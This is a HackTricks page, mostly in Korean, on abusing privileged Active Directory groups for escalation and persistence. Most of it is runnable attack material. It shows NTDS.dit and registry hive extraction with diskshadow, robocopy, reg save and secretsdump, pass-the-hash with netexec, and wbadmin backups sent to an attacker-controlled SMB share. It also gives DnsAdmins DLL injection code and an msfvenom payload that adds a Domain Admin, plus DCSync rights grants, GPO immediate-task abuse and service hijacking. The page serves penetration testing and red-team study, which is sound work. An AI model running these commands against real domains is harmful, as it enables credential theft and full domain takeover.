# 특권 그룹

{{#include ../../banners/hacktricks-training.md}}

## 관리자 권한을 가진 잘 알려진 그룹

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

이 그룹은 도메인에서 관리자 권한이 아닌 계정 및 그룹을 생성할 수 있는 권한을 가집니다. 추가로, Domain Controller (DC)에 대한 로컬 로그인을 허용합니다.

이 그룹의 구성원을 확인하기 위해 다음 명령어를 실행합니다:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
새 사용자를 추가하는 것과 DC에 대한 로컬 로그인 모두 허용됩니다.

## AdminSDHolder 그룹

**AdminSDHolder** 그룹의 Access Control List(ACL)는 Active Directory 내의 모든 "protected groups"(특히 고권한 그룹)에 대한 권한을 설정하므로 매우 중요합니다. 이 메커니즘은 무단 수정으로부터 이러한 그룹의 보안을 보장합니다.

공격자는 **AdminSDHolder** 그룹의 ACL을 수정하여 일반 사용자에게 전체 권한을 부여함으로써 이를 악용할 수 있습니다. 이렇게 되면 해당 사용자는 모든 protected groups에 대한 완전한 제어권을 갖게 됩니다. 이 사용자의 권한이 변경되거나 제거되더라도 시스템 설계상 한 시간 이내에 자동으로 복원됩니다.

최근 Windows Server 문서에서는 여러 내장 operator 그룹을 여전히 **protected** 객체로 취급합니다 (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, 등). **SDProp** 프로세스는 기본적으로 **PDC Emulator**에서 60분마다 실행되어 `adminCount=1`을 찍고 보호된 객체에 대해 상속을 비활성화합니다. 이는 persistence를 유지하는 데 유용하며, protected group에서 제거되었지만 여전히 상속 비활성화된 ACL을 가진 stale privileged 사용자를 탐지하는 데도 유용합니다.

멤버를 검토하고 권한을 수정하기 위한 명령은 다음과 같습니다:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
복구 과정을 가속화하기 위한 스크립트가 제공됩니다: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

자세한 내용은 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)을 방문하세요.

## AD Recycle Bin

이 그룹의 구성원은 삭제된 Active Directory 객체를 읽을 수 있어 민감한 정보가 노출될 수 있습니다:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
이는 **이전 권한 경로를 복구하는 데** 유용하다. 삭제된 객체는 여전히 `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, 오래된 SPNs, 또는 나중에 다른 운영자가 복원할 수 있는 삭제된 권한 그룹의 DN을 노출할 수 있다.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Domain Controller 접근

DC의 파일에 대한 접근은 사용자가 `Server Operators` 그룹의 구성원이 아닌 한 제한됩니다. 이 그룹에 속하면 접근 권한이 바뀝니다.

### Privilege Escalation

`PsService` 또는 `sc`를 포함한 Sysinternals 도구를 사용하면 서비스 권한을 검사하고 수정할 수 있습니다. 예를 들어 `Server Operators` 그룹은 특정 서비스에 대해 전체 권한을 가지고 있어 임의 명령 실행 및 privilege escalation을 허용합니다:
```cmd
C:\> .\PsService.exe security AppReadiness
```
이 명령은 `Server Operators`가 전체 액세스 권한을 가지고 있어 서비스 조작을 통해 권한 상승을 수행할 수 있음을 보여줍니다.

## Backup Operators

`Backup Operators` 그룹의 멤버십은 `SeBackup` 및 `SeRestore` 권한으로 인해 `DC01` 파일 시스템에 대한 접근을 제공합니다. 이러한 권한은 `FILE_FLAG_BACKUP_SEMANTICS` 플래그를 사용하여 명시적 권한이 없어도 폴더 순회, 목록 조회 및 파일 복사 기능을 가능하게 합니다. 이 프로세스에는 특정 스크립트를 사용하는 것이 필요합니다.

그룹 멤버를 나열하려면 다음을 실행하세요:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### 로컬 공격

이러한 권한을 로컬에서 활용하기 위해 다음 단계를 수행합니다:

1. 필요한 라이브러리 가져오기:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` 활성화 및 확인:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 제한된 디렉터리의 파일에 접근하여 복사합니다. 예:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD 공격

도메인 컨트롤러의 파일 시스템에 직접 접근하면 도메인 사용자와 컴퓨터의 모든 NTLM 해시를 포함하는 `NTDS.dit` 데이터베이스를 탈취할 수 있습니다.

#### diskshadow.exe 사용

1. `C` 드라이브의 섀도 복사본을 생성합니다:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. shadow copy에서 `NTDS.dit`를 복사합니다:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
또는 파일 복사에는 `robocopy`를 사용하세요:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. hash 획득을 위해 `SYSTEM` 및 `SAM`을 추출:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit`에서 모든 해시를 가져오기:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. 추출 후: DA로 Pass-the-Hash
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### wbadmin.exe 사용하기

1. 공격자 머신에서 SMB 서버용 NTFS 파일시스템을 설정하고 대상 머신에서 SMB credentials를 캐시합니다.
2. 시스템 백업 및 `NTDS.dit` 추출을 위해 `wbadmin.exe`를 사용합니다:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

실습 데모는 [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)를 참조하세요.

## DnsAdmins

**DnsAdmins** 그룹 구성원은 권한을 악용해 종종 Domain Controllers에서 호스팅되는 DNS 서버에 SYSTEM 권한으로 임의의 DLL을 로드할 수 있습니다. 이 기능은 상당한 악용 가능성을 제공합니다.

DnsAdmins 그룹의 구성원을 나열하려면 다음을 사용하세요:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> 이 취약점은 DNS 서비스(보통 DCs 내부)에서 SYSTEM 권한으로 임의의 코드를 실행할 수 있게 합니다. 이 문제는 2021년에 수정되었습니다.

멤버들은 다음과 같은 명령을 사용해 DNS 서버가 로컬 또는 원격 공유에서 임의의 DLL을 로드하도록 만들 수 있습니다:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DLL이 로드되려면 DNS 서비스를 재시작해야 합니다(추가 권한이 필요할 수 있음):
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
이 공격 벡터에 대한 자세한 내용은 ired.team을 참조하세요.

#### Mimilib.dll

mimilib.dll을 수정해 특정 명령이나 reverse shells를 실행하도록 하여 명령 실행에 사용하는 것도 가능합니다. 자세한 내용은 [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)를 확인하세요.

### WPAD 레코드 (MitM)

DnsAdmins는 글로벌 쿼리 차단 목록을 비활성화한 후 WPAD 레코드를 생성하여 Man-in-the-Middle (MitM) 공격을 수행하기 위해 DNS 레코드를 조작할 수 있습니다. Responder나 Inveigh와 같은 도구를 사용해 스푸핑하고 네트워크 트래픽을 캡처할 수 있습니다.

### 이벤트 로그 리더
구성원은 이벤트 로그에 접근할 수 있으며 평문 비밀번호나 명령 실행 세부 정보와 같은 민감한 정보를 찾을 수 있습니다:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows 권한

이 그룹은 도메인 객체의 DACLs를 수정할 수 있어 잠재적으로 DCSync 권한을 부여할 수 있습니다. Techniques for privilege escalation exploiting this group are detailed in Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
이 그룹의 구성원으로 행동할 수 있다면, 전형적인 악용 방법은 공격자가 제어하는 principal에게 [DCSync](dcsync.md)에 필요한 복제 권한을 부여하는 것입니다:
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historically, **PrivExchange** chained mailbox access, coerced Exchange authentication, and LDAP relay to land on this same primitive. Even where that relay path is mitigated, direct membership in `Exchange Windows Permissions` or control of an Exchange server remains a high-value route to domain replication rights.

## Hyper-V Administrators

Hyper-V Administrators는 Hyper-V에 대한 전체 접근 권한을 가지고 있으며, 이를 악용하면 가상화된 Domain Controllers를 제어할 수 있습니다. 여기에는 라이브 DC를 복제(clone)하거나 NTDS.dit 파일에서 NTLM 해시를 추출하는 작업이 포함됩니다.

### 악용 예시

실무에서의 악용은 오래된 호스트 수준 LPE 트릭보다는 주로 **offline access to DC disks/checkpoints**입니다. Hyper-V 호스트에 접근할 수 있다면 운영자는 가상화된 Domain Controller의 체크포인트를 만들거나 내보낸 후 VHDX를 마운트하여 게스트 내부의 LSASS를 건드리지 않고 `NTDS.dit`, `SYSTEM`, 및 기타 비밀을 추출할 수 있습니다:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
그 지점에서 `Backup Operators` 워크플로우를 재사용하여 `Windows\NTDS\ntds.dit` 및 레지스트리 하이브를 오프라인으로 복사하세요.

## 그룹 정책 생성자 소유자

이 그룹은 도메인에서 그룹 정책을 생성할 수 있는 권한을 구성원에게 부여합니다. 다만, 구성원은 사용자나 그룹에 그룹 정책을 적용하거나 기존 GPOs를 편집할 수는 없습니다.

중요한 차이점은 **생성자가 새 GPO의 소유자가 된다**는 점이며 일반적으로 이후 해당 GPO를 편집할 수 있는 충분한 권한을 얻게 된다는 것입니다. 즉, 이 그룹은 다음 중 하나를 할 수 있을 때 흥미로운 대상입니다:

- 악성 GPO를 생성하고 관리자를 설득해 대상 OU/도메인에 링크하도록 만든다
- 이미 유용한 곳에 연결되어 있는 자신이 생성한 GPO를 편집한다
- GPO를 연결할 수 있게 해주는 다른 위임된 권한을 악용하는 동안, 이 그룹이 편집 측면을 제공한다

실제 악용은 보통 SYSVOL-backed 정책 파일을 통해 **Immediate Task**, **startup script**, **local admin membership**, 또는 **user rights assignment** 변경을 추가하는 것을 의미합니다.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
If editing the GPO manually through `SYSVOL`, remember the change is not enough by itself: `versionNumber`, `GPT.ini`, and sometimes `gPCMachineExtensionNames` must also be updated or clients will ignore the policy refresh.

## Organization Management

In environments where **Microsoft Exchange** is deployed, a special group known as **Organization Management** holds significant capabilities. This group is privileged to **access the mailboxes of all domain users** and maintains **full control over the 'Microsoft Exchange Security Groups'** Organizational Unit (OU). This control includes the **`Exchange Windows Permissions`** group, which can be exploited for privilege escalation.

### Privilege Exploitation and Commands

#### Print Operators

Members of the **Print Operators** group are endowed with several privileges, including the **`SeLoadDriverPrivilege`**, which allows them to **log on locally to a Domain Controller**, shut it down, and manage printers. To exploit these privileges, especially if **`SeLoadDriverPrivilege`** is not visible under an unelevated context, bypassing User Account Control (UAC) is necessary.

To list the members of this group, the following PowerShell command is used:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
도메인 컨트롤러에서는 이 그룹이 위험합니다. 기본 도메인 컨트롤러 정책이 **`SeLoadDriverPrivilege`** 를 `Print Operators` 에게 부여하기 때문입니다. 이 그룹 구성원의 권한 상승 토큰을 얻으면 해당 권한을 활성화하고 서명되었지만 취약한 드라이버를 로드하여 kernel/SYSTEM으로 점프할 수 있습니다. 토큰 처리에 대한 자세한 내용은 [Access Tokens](../windows-local-privilege-escalation/access-tokens.md)을 확인하세요.

#### 원격 데스크톱 사용자

이 그룹의 구성원들은 Remote Desktop Protocol (RDP)을 통해 PC에 액세스할 수 있습니다. 이 구성원들을 열거하려면 PowerShell 명령을 사용할 수 있습니다:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDP를 악용하는 추가적인 통찰은 전용 pentesting 자료에서 찾을 수 있습니다.

#### 원격 관리 사용자

구성원은 **Windows Remote Management (WinRM)**을 통해 PC에 접근할 수 있습니다. 이러한 구성원들의 열거는 다음을 통해 수행됩니다:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM**과 관련된 exploitation techniques에 대해서는 특정 문서를 참조해야 합니다.

#### Server Operators

이 그룹은 Domain Controllers에서 백업 및 복원 권한, 시스템 시간 변경, 시스템 종료 등을 포함한 다양한 구성을 수행할 권한을 갖습니다. 멤버를 열거하려면 제공된 명령은 다음과 같습니다:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
도메인 컨트롤러에서는 `Server Operators`가 일반적으로 **reconfigure or start/stop services**할 수 있는 충분한 권한을 상속받고 또한 기본 DC 정책을 통해 `SeBackupPrivilege`/`SeRestorePrivilege`를 부여받습니다. 실무에서는 이것이 그들을 **service-control abuse**와 **NTDS extraction** 사이의 다리로 만듭니다:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
서비스 ACL이 이 그룹에 변경/시작 권한을 부여하면, 서비스를 임의의 명령으로 지정하고 `LocalSystem`으로 시작한 뒤 원래의 `binPath`를 복원한다. 서비스 제어가 잠겨 있으면, 위의 `Backup Operators` 기법으로 돌아가 `NTDS.dit`을 복사한다.

## 참조 <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
